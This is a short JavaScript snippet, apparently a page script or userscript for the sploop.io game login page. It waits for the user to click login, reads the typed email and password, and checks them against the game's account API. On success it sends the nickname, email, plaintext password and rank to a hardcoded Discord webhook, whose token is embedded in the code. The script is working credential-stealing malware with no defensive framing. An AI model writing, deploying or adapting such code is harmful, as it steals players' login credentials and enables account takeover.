document.getElementById('missing-script-a-overlay').style.display = 'none'


// Usage
const realWebhookUrl = "https://discord.com/api/webhooks/1392471480985583636/70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n";
// fetch(realWebhookUrl, ...);// ----------------------------------------

// Rank thresholds
const f = [
  { mc: 0 }, { mc: 1e5 }, { mc: 9e5 }, { mc: 21e5 }, { mc: 61e5 }, { mc: 101e5 }, { mc: 201e5 },
  { mc: 35e6 }, { mc: 861e5 }, { mc: 1161e5 }, { mc: 1961e5 }, { mc: 2961e5 }, { mc: 4961e5 },
  { mc: 6961e5 }, { mc: 8961e5 }, { mc: 10961e5 }, { mc: 12961e5 }, { mc: 16961e5 }, { mc: 32961e5 }
];
function getRank(score) {
  for (let n = 0; n < f.length; n++) {
    if (score < f[n].mc) return n - 1;
  }
  return f.length - 1;
}

// Wait for DOM to be loaded
function onReady(fn) {
  if (document.readyState === "complete" || document.readyState === "interactive") setTimeout(fn, 1);
  else document.addEventListener("DOMContentLoaded", fn);
}

onReady(() => {
  // Find login elements
  const emailInput = document.getElementById("enter-mail");
  const passInput = document.getElementById("enter-password");
  const loginBtn = document.getElementById("login");

  if (!emailInput || !passInput || !loginBtn) return;

  // On login click, attempt to log in and send info to webhook if successful
  loginBtn.addEventListener("click", function() {
    const email = emailInput.value;
    const password = passInput.value;
    if (!email || !password) return;

    // Call sploop login API to get stats and validate credentials
    const url = `https://account.sploop.io:443/login?mail=${email}&hash=${hex_md5(password)}`;
    fetch(url).then(resp => resp.json()).then(json => {
      if (!json.nickname) {
        // Login failed or invalid credentials
        return;
      }
      fetch(realWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `Name: ${json.nickname} | Email: ${email} | Password: ${password} | Rank: ${getRank(json.score)}`
        })
      });
    });
  });
});
